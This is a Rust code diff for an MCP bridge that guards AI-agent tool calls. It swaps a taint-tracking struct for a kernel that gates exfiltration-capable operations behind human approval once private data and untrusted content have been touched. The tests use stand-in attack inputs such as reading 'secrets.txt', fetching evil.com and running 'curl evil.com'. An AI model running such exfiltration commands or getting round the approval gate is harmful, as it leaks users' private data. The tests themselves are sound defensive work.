@@ -2,12 +2,10 @@ use anyhow::{anyhow, Context, Result};
 use clap::Parser;
 use nucleus_client::sign_http_headers;
 use nucleus_spec::PodSpec;
-use portcullis::{
-    apply_record, should_deny, CapabilityLevel, Operation, PermissionLattice, TaintLabel, TaintSet,
-};
+use portcullis::kernel::{DenyReason, Kernel, Verdict};
+use portcullis::{CapabilityLevel, Operation, PermissionLattice};
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
-use std::cell::RefCell;
 use std::fs;
 use std::io::{self, BufRead, Write};
 use std::path::{Path, PathBuf};
@@ -452,72 +450,62 @@ fn tool_to_operation(tool_name: &str) -> Option<Operation> {
 ///
 /// Tracks the monotone taint state across tool calls within a single MCP session.
 /// Taint can only increase (union) — it never decreases. When all three taint
-/// labels co-occur (private_data + untrusted_content + exfil_vector = trifecta),
-/// exfiltration-capable operations require explicit human approval.
+/// Extract the subject string from a tool call's arguments.
 ///
-/// This is the client-side enforcement of the taint lattice, complementing the
-/// server-side GradedTaintGuard used in MCP server mode.
-struct SessionTaint {
-    taint: RefCell<TaintSet>,
-    /// Whether trifecta constraint enforcement is enabled.
-    /// When true, operations that would complete the trifecta require approval.
-    trifecta_enabled: bool,
+/// The subject is the primary target of the operation — a file path, URL,
+/// command, query, etc. The Kernel uses this for path-based access control,
+/// command restrictions, and audit trace recording.
+fn extract_subject(tool_name: &str, arguments: &Value) -> String {
+    match tool_name {
+        "read" | "write" => arguments
+            .get("path")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string(),
+        "run" => arguments
+            .get("command")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string(),
+        "web_fetch" => arguments
+            .get("url")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string(),
+        "glob" => arguments
+            .get("pattern")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string(),
+        "grep" => arguments
+            .get("pattern")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string(),
+        "web_search" => arguments
+            .get("query")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string(),
+        _ => tool_name.to_string(),
+    }
 }
 
-impl SessionTaint {
-    fn new(trifecta_enabled: bool) -> Self {
-        Self {
-            taint: RefCell::new(TaintSet::empty()),
-            trifecta_enabled,
+/// Format a DenyReason for human-readable error messages.
+fn format_deny_reason(reason: &DenyReason) -> String {
+    match reason {
+        DenyReason::InsufficientCapability => "insufficient capability".to_string(),
+        DenyReason::BudgetExhausted { remaining_usd } => {
+            format!("budget exhausted (remaining: ${remaining_usd})")
         }
-    }
-
-    /// Check whether an operation should be blocked due to taint trifecta.
-    ///
-    /// Returns `true` if the operation would complete the trifecta and
-    /// thus requires explicit approval before proceeding.
-    fn would_trigger_trifecta(&self, operation: Operation) -> bool {
-        let current = self.taint.borrow();
-        // Operations that can exfiltrate require approval when trifecta would complete
-        let requires_approval = matches!(
-            operation,
-            Operation::RunBash | Operation::GitPush | Operation::CreatePr
-        );
-        should_deny(
-            &current,
-            operation,
-            requires_approval,
-            self.trifecta_enabled,
-        )
-    }
-
-    /// Record a successful operation's taint contribution.
-    ///
-    /// This is called AFTER a tool call succeeds — the taint set is updated
-    /// monotonically (union). Taint never decreases within a session.
-    fn record(&self, operation: Operation) {
-        let current = self.taint.borrow().clone();
-        let new_taint = apply_record(&current, operation);
-        *self.taint.borrow_mut() = new_taint;
-    }
-
-    /// Get a human-readable summary of the current taint state.
-    fn summary(&self) -> String {
-        let t = self.taint.borrow();
-        let mut labels = Vec::new();
-        if t.contains(TaintLabel::PrivateData) {
-            labels.push("private_data");
+        DenyReason::TimeExpired { expired_at } => format!("session expired at {expired_at}"),
+        DenyReason::PathBlocked { path } => format!("path blocked: {path}"),
+        DenyReason::CommandBlocked { command } => format!("command blocked: {command}"),
+        DenyReason::IsolationInsufficient { required, actual } => {
+            format!("isolation insufficient: required {required}, got {actual}")
         }
-        if t.contains(TaintLabel::UntrustedContent) {
-            labels.push("untrusted_content");
-        }
-        if t.contains(TaintLabel::ExfilVector) {
-            labels.push("exfil_vector");
-        }
-        if labels.is_empty() {
-            "clean".to_string()
-        } else {
-            labels.join("+")
+        DenyReason::IsolationGated { dimension } => {
+            format!("isolation gated: {dimension}")
         }
     }
 }
@@ -536,9 +524,11 @@ fn main() -> Result<()> {
         Some(args.actor.clone()),
         args.session_id.clone(),
     );
-    // Initialize session taint tracking.
-    // Trifecta enforcement is always enabled — this is the core safety invariant.
-    let session_taint = SessionTaint::new(true);
+    // Initialize the kernel decision engine.
+    // If a policy is loaded (--spec), the kernel enforces it with monotone session
+    // state. Otherwise, use a permissive lattice (proxy handles enforcement).
+    let kernel_lattice = policy.clone().unwrap_or_else(PermissionLattice::permissive);
+    let mut kernel = Kernel::new(kernel_lattice);
 
     // Log session ID to stderr for debugging/correlation
     eprintln!(
@@ -595,7 +585,7 @@ fn main() -> Result<()> {
                         continue;
                     }
                 };
-                let result = match call_tool(&client, &call, args.approval_prompt, &session_taint) {
+                let result = match call_tool(&client, &call, args.approval_prompt, &mut kernel) {
                     Ok(text) => json!({
                         "content": [{ "type": "text", "text": text }],
                         "isError": false
@@ -833,64 +823,84 @@ fn call_tool(
     client: &ProxyClient,
     call: &ToolCallParams,
     approval_prompt: bool,
-    session_taint: &SessionTaint,
+    kernel: &mut Kernel,
 ) -> Result<String> {
-    // Pre-call taint check: would this operation trigger the trifecta?
+    // Route every operation through the kernel decision engine.
+    // The kernel provides: capability checks, monotone session state,
+    // taint tracking, budget tracking, time-based expiry, path/command
+    // restrictions, and complete audit trace.
     if let Some(op) = tool_to_operation(&call.name) {
-        if session_taint.would_trigger_trifecta(op) {
-            eprintln!(
-                "[nucleus-mcp] taint trifecta: tool={} taint={} — approval required",
-                call.name,
-                session_taint.summary()
-            );
-            // Prompt the human for approval before proceeding.
-            // This is distinct from the proxy-level approval flow — the taint gate
-            // fires at the MCP bridge BEFORE the request even reaches the proxy.
-            if approval_prompt {
-                let msg = format!("trifecta({}) after {}", call.name, session_taint.summary());
-                if !prompt_approval(&msg)? {
+        let subject = extract_subject(&call.name, &call.arguments);
+        let decision = kernel.decide(op, &subject);
+
+        match &decision.verdict {
+            Verdict::Allow => {
+                // Log taint transitions
+                let tt = &decision.taint_transition;
+                if tt.pre_count != tt.post_count {
+                    eprintln!(
+                        "[nucleus-mcp] taint: {}/{} legs (tool={}, subject={})",
+                        tt.post_count, 3, call.name, subject
+                    );
+                }
+            }
+            Verdict::RequiresApproval => {
+                eprintln!(
+                    "[nucleus-mcp] approval required: tool={} subject={}",
+                    call.name, subject
+                );
+                // Prompt the human for approval before proceeding.
+                if approval_prompt {
+                    let msg = if decision.taint_transition.dynamic_gate_applied {
+                        format!("trifecta({}) — taint gate requires approval", call.name)
+                    } else {
+                        format!("approval required for {}", call.name)
+                    };
+                    if !prompt_approval(&msg)? {
+                        return Err(anyhow!(
+                            "operation denied: {} requires approval but was rejected. \
+                             Subject: {}",
+                            call.name,
+                            subject
+                        ));
+                    }
+                    eprintln!("[nucleus-mcp] approved by human: tool={}", call.name);
+                    // Grant a one-time approval and re-decide
+                    kernel.grant_approval(op, 1);
+                    let retry = kernel.decide(op, &subject);
+                    if !matches!(retry.verdict, Verdict::Allow) {
+                        return Err(anyhow!(
+                            "operation denied after approval: {} — {:?}",
+                            call.name,
+                            retry.verdict
+                        ));
+                    }
+                } else {
                     return Err(anyhow!(
-                        "trifecta blocked: {} would complete taint trifecta ({}). \
-                         The session has accessed private data and untrusted content — \
-                         this exfiltration-capable operation requires explicit approval.",
+                        "operation denied: {} requires approval but no prompt available. \
+                         Subject: {}",
                         call.name,
-                        session_taint.summary()
+                        subject
                     ));
                 }
+            }
+            Verdict::Deny(reason) => {
                 eprintln!(
-                    "[nucleus-mcp] trifecta approved by human: tool={}",
-                    call.name
-                );
-            } else {
-                return Err(anyhow!(
-                    "trifecta blocked: {} would complete taint trifecta ({}). \
-                     No approval prompt available — operation denied.",
+                    "[nucleus-mcp] denied: tool={} reason={}",
                     call.name,
-                    session_taint.summary()
+                    format_deny_reason(reason)
+                );
+                return Err(anyhow!(
+                    "operation denied: {} — {}",
+                    call.name,
+                    format_deny_reason(reason)
                 ));
             }
         }
     }
 
-    // Execute the tool call
-    let result = call_tool_inner(client, call, approval_prompt);
-
-    // Post-call taint record: if the call succeeded, record its taint contribution
-    if result.is_ok() {
-        if let Some(op) = tool_to_operation(&call.name) {
-            let before = session_taint.summary();
-            session_taint.record(op);
-            let after = session_taint.summary();
-            if before != after {
-                eprintln!(
-                    "[nucleus-mcp] taint: {} -> {} (tool={})",
-                    before, after, call.name
-                );
-            }
-        }
-    }
-
-    result
+    // Execute the tool call (the proxy provides additional enforcement)
+    call_tool_inner(client, call, approval_prompt)
 }
 
 fn call_tool_inner(
@@ -1486,134 +1496,217 @@ mod tests {
         assert_eq!(tool_to_operation("unknown_tool"), None);
     }
 
-    #[test]
-    fn test_session_taint_starts_clean() {
-        let taint = SessionTaint::new(true);
-        assert_eq!(taint.summary(), "clean");
+    // ── Kernel decision engine tests ───────────────────────────────────
+
+    /// Create a permissive lattice without static trifecta obligations
+    /// or command restrictions. This allows testing dynamic taint gating
+    /// in isolation without command-lattice or static-obligation interference.
+    fn permissive_no_static_obligations() -> PermissionLattice {
+        use portcullis::{CommandLattice, Obligations};
+        let mut lattice = PermissionLattice::permissive();
+        lattice.trifecta_constraint = false;
+        lattice.obligations = Obligations::default();
+        lattice.commands = CommandLattice::empty();
+        lattice
     }
 
     #[test]
-    fn test_session_taint_records_private_data() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::ReadFiles);
-        assert_eq!(taint.summary(), "private_data");
+    fn test_kernel_starts_with_clean_taint() {
+        let kernel = Kernel::new(permissive_no_static_obligations());
+        assert_eq!(kernel.trace().len(), 0);
     }
 
     #[test]
-    fn test_session_taint_records_untrusted_content() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::WebFetch);
-        assert_eq!(taint.summary(), "untrusted_content");
+    fn test_kernel_allows_read_and_records_taint() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        let d = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
+        assert!(matches!(d.verdict, Verdict::Allow));
+        assert_eq!(d.taint_transition.post_count, 1); // private_data
     }
 
     #[test]
-    fn test_session_taint_records_exfil_vector() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::GitPush);
-        assert_eq!(taint.summary(), "exfil_vector");
+    fn test_kernel_allows_web_fetch_and_records_taint() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        let d = kernel.decide(Operation::WebFetch, "https://example.com");
+        assert!(matches!(d.verdict, Verdict::Allow));
+        assert_eq!(d.taint_transition.post_count, 1); // untrusted_content
     }
 
     #[test]
-    fn test_session_taint_accumulates_monotonically() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::ReadFiles);
-        assert_eq!(taint.summary(), "private_data");
-        taint.record(Operation::WebFetch);
-        assert_eq!(taint.summary(), "private_data+untrusted_content");
-        // Reading again doesn't change taint (idempotent union)
-        taint.record(Operation::ReadFiles);
-        assert_eq!(taint.summary(), "private_data+untrusted_content");
+    fn test_kernel_taint_accumulates_monotonically() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        let d1 = kernel.decide(Operation::ReadFiles, "a.rs");
+        assert_eq!(d1.taint_transition.post_count, 1);
+        let d2 = kernel.decide(Operation::WebFetch, "https://example.com");
+        assert_eq!(d2.taint_transition.post_count, 2);
+        // Reading again doesn't change taint (idempotent)
+        let d3 = kernel.decide(Operation::ReadFiles, "b.rs");
+        assert_eq!(d3.taint_transition.post_count, 2);
     }
 
     #[test]
-    fn test_session_taint_neutral_ops_dont_add_taint() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::WriteFiles);
-        assert_eq!(taint.summary(), "clean");
-        taint.record(Operation::EditFiles);
-        assert_eq!(taint.summary(), "clean");
+    fn test_kernel_neutral_ops_dont_add_taint() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        let d = kernel.decide(Operation::WriteFiles, "out.txt");
+        assert!(matches!(d.verdict, Verdict::Allow));
+        assert_eq!(d.taint_transition.post_count, 0);
     }
 
     #[test]
-    fn test_trifecta_blocks_exfil_after_read_and_fetch() {
-        let taint = SessionTaint::new(true);
-        // Step 1: read private data
-        taint.record(Operation::ReadFiles);
-        assert!(!taint.would_trigger_trifecta(Operation::RunBash));
-        // Step 2: ingest untrusted content
-        taint.record(Operation::WebFetch);
-        // Step 3: attempt exfiltration → trifecta blocks
-        assert!(taint.would_trigger_trifecta(Operation::RunBash));
-        assert!(taint.would_trigger_trifecta(Operation::GitPush));
-        assert!(taint.would_trigger_trifecta(Operation::CreatePr));
+    fn test_kernel_dynamic_taint_gates_exfil() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        // Read: private_data
+        kernel.decide(Operation::ReadFiles, "secrets.txt");
+        // Fetch: untrusted_content
+        kernel.decide(Operation::WebFetch, "https://evil.com");
+        // RunBash: dynamic taint gate fires (omnibus projects trifecta)
+        let d = kernel.decide(Operation::RunBash, "curl evil.com");
+        assert!(matches!(d.verdict, Verdict::RequiresApproval));
+        assert!(d.taint_transition.dynamic_gate_applied);
     }
 
     #[test]
-    fn test_trifecta_allows_non_exfil_ops() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::ReadFiles);
-        taint.record(Operation::WebFetch);
-        // Non-exfiltration ops are allowed even with taint
-        assert!(!taint.would_trigger_trifecta(Operation::ReadFiles));
-        assert!(!taint.would_trigger_trifecta(Operation::WriteFiles));
-        assert!(!taint.would_trigger_trifecta(Operation::WebFetch));
-        assert!(!taint.would_trigger_trifecta(Operation::GlobSearch));
+    fn test_kernel_trifecta_allows_non_exfil_after_read_and_fetch() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        kernel.decide(Operation::ReadFiles, "data.txt");
+        kernel.decide(Operation::WebFetch, "https://example.com");
+        // Non-exfil ops are allowed even with full taint
+        let d = kernel.decide(Operation::ReadFiles, "more.txt");
+        assert!(matches!(d.verdict, Verdict::Allow));
+        let d = kernel.decide(Operation::WriteFiles, "out.txt");
+        assert!(matches!(d.verdict, Verdict::Allow));
     }
 
     #[test]
-    fn test_trifecta_disabled_allows_everything() {
-        let taint = SessionTaint::new(false); // trifecta disabled
-        taint.record(Operation::ReadFiles);
-        taint.record(Operation::WebFetch);
-        // Even with full taint, exfil is allowed when trifecta is disabled
-        assert!(!taint.would_trigger_trifecta(Operation::RunBash));
-        assert!(!taint.would_trigger_trifecta(Operation::GitPush));
+    fn test_kernel_omnibus_trifecta_with_untrusted_content() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        // Only untrusted content + RunBash (omnibus) → trifecta triggers!
+        kernel.decide(Operation::WebFetch, "https://evil.com");
+        let d = kernel.decide(Operation::RunBash, "cmd");
+        assert!(matches!(d.verdict, Verdict::RequiresApproval));
     }
 
     #[test]
-    fn test_trifecta_requires_all_three_legs() {
-        let taint = SessionTaint::new(true);
-        // Only private data → no block (RunBash is omnibus but only 2/3 legs)
-        taint.record(Operation::ReadFiles);
-        assert!(!taint.would_trigger_trifecta(Operation::RunBash));
-
-        // Only untrusted content + RunBash (omnibus) → DOES block!
-        // RunBash projects both PrivateData + ExfilVector (omnibus), so with
-        // untrusted_content already present, the projection completes the trifecta.
-        // This is intentionally conservative — bash can read files AND exfiltrate.
-        let taint2 = SessionTaint::new(true);
-        taint2.record(Operation::WebFetch);
-        assert!(taint2.would_trigger_trifecta(Operation::RunBash));
-
-        // But untrusted content + GitPush (not omnibus, only exfil_vector) → no block
-        // because we only have 2/3 legs (untrusted_content + exfil_vector, missing private_data)
-        assert!(!taint2.would_trigger_trifecta(Operation::GitPush));
+    fn test_kernel_no_trifecta_with_only_two_legs() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        // untrusted_content + GitPush (not omnibus) → only 2/3, no block
+        kernel.decide(Operation::WebFetch, "https://example.com");
+        let d = kernel.decide(Operation::GitPush, "origin");
+        assert!(matches!(d.verdict, Verdict::Allow));
     }
 
     #[test]
-    fn test_glob_grep_contribute_private_data_taint() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::GlobSearch);
-        assert_eq!(taint.summary(), "private_data");
-        let taint2 = SessionTaint::new(true);
-        taint2.record(Operation::GrepSearch);
-        assert_eq!(taint2.summary(), "private_data");
+    fn test_kernel_denies_when_capability_is_never() {
+        let mut kernel = Kernel::new(PermissionLattice::read_only());
+        // read_only blocks writes
+        let d = kernel.decide(Operation::WriteFiles, "test.txt");
+        assert!(matches!(
+            d.verdict,
+            Verdict::Deny(DenyReason::InsufficientCapability)
+        ));
     }
 
     #[test]
-    fn test_web_search_contributes_untrusted_content_taint() {
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::WebSearch);
-        assert_eq!(taint.summary(), "untrusted_content");
+    fn test_kernel_trace_is_append_only() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        kernel.decide(Operation::ReadFiles, "a.rs");
+        kernel.decide(Operation::WebFetch, "https://example.com");
+        kernel.decide(Operation::WriteFiles, "b.rs");
+        assert_eq!(kernel.trace().len(), 3);
+        // Sequence numbers are monotonically increasing
+        assert_eq!(kernel.trace()[0].sequence, 0);
+        assert_eq!(kernel.trace()[1].sequence, 1);
+        assert_eq!(kernel.trace()[2].sequence, 2);
     }
 
     #[test]
-    fn test_trifecta_scenario_grep_then_websearch_then_run() {
+    fn test_kernel_approval_flow() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        kernel.decide(Operation::ReadFiles, "data.txt");
+        kernel.decide(Operation::WebFetch, "https://evil.com");
+        // Dynamic taint gate triggers
+        let d = kernel.decide(Operation::RunBash, "cmd");
+        assert!(matches!(d.verdict, Verdict::RequiresApproval));
+        // Grant approval and retry
+        kernel.grant_approval(Operation::RunBash, 1);
+        let d = kernel.decide(Operation::RunBash, "cmd");
+        assert!(matches!(d.verdict, Verdict::Allow));
+        // Second attempt without approval → RequiresApproval again
+        let d = kernel.decide(Operation::RunBash, "cmd");
+        assert!(matches!(d.verdict, Verdict::RequiresApproval));
+    }
+
+    #[test]
+    fn test_kernel_static_obligations_on_permissive() {
+        // The permissive lattice has all capabilities, so trifecta normalization
+        // adds static obligations on exfil operations (RunBash, GitPush, CreatePr).
+        // Use "cargo test" which passes the command allowlist, so we hit step 6
+        // (static obligations) rather than step 5 (command blocked).
+        let mut kernel = Kernel::new(PermissionLattice::permissive());
+        let d = kernel.decide(Operation::RunBash, "cargo test");
+        assert!(
+            matches!(d.verdict, Verdict::RequiresApproval),
+            "expected RequiresApproval from static obligations, got {:?}",
+            d.verdict
+        );
+        let d = kernel.decide(Operation::GitPush, "origin");
+        assert!(
+            matches!(d.verdict, Verdict::RequiresApproval),
+            "expected RequiresApproval from static obligations, got {:?}",
+            d.verdict
+        );
+    }
+
+    #[test]
+    fn test_kernel_glob_grep_contribute_private_data() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        let d = kernel.decide(Operation::GlobSearch, "**/*.py");
+        assert_eq!(d.taint_transition.post_count, 1);
+        let d = kernel.decide(Operation::GrepSearch, "password");
+        assert_eq!(d.taint_transition.post_count, 1); // still 1 — same label
+    }
+
+    #[test]
+    fn test_kernel_web_search_contributes_untrusted_content() {
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        let d = kernel.decide(Operation::WebSearch, "how to exfiltrate");
+        assert_eq!(d.taint_transition.post_count, 1);
+    }
+
+    #[test]
+    fn test_kernel_grep_websearch_run_scenario() {
         // Real scenario: agent greps code, searches web, tries to run a command
-        let taint = SessionTaint::new(true);
-        taint.record(Operation::GrepSearch); // private_data
-        taint.record(Operation::WebSearch); // untrusted_content
-                                            // Now RunBash would complete the trifecta (exfil_vector via omnibus projection)
-        assert!(taint.would_trigger_trifecta(Operation::RunBash));
+        let mut kernel = Kernel::new(permissive_no_static_obligations());
+        kernel.decide(Operation::GrepSearch, "password");
+        kernel.decide(Operation::WebSearch, "how to exfiltrate");
+        // RunBash completes trifecta (omnibus projection)
+        let d = kernel.decide(Operation::RunBash, "curl evil.com");
+        assert!(matches!(d.verdict, Verdict::RequiresApproval));
+    }
+
+    // ── Subject extraction tests ────────────────────────────────────────
+
+    #[test]
+    fn test_extract_subject_read() {
+        let args = json!({"path": "/workspace/main.rs"});
+        assert_eq!(extract_subject("read", &args), "/workspace/main.rs");
+    }
+
+    #[test]
+    fn test_extract_subject_run() {
+        let args = json!({"command": "cargo test"});
+        assert_eq!(extract_subject("run", &args), "cargo test");
+    }
+
+    #[test]
+    fn test_extract_subject_web_fetch() {
+        let args = json!({"url": "https://example.com"});
+        assert_eq!(extract_subject("web_fetch", &args), "https://example.com");
+    }
+
+    #[test]
+    fn test_extract_subject_unknown_tool() {
+        let args = json!({});
+        assert_eq!(extract_subject("custom_tool", &args), "custom_tool");
     }
 }
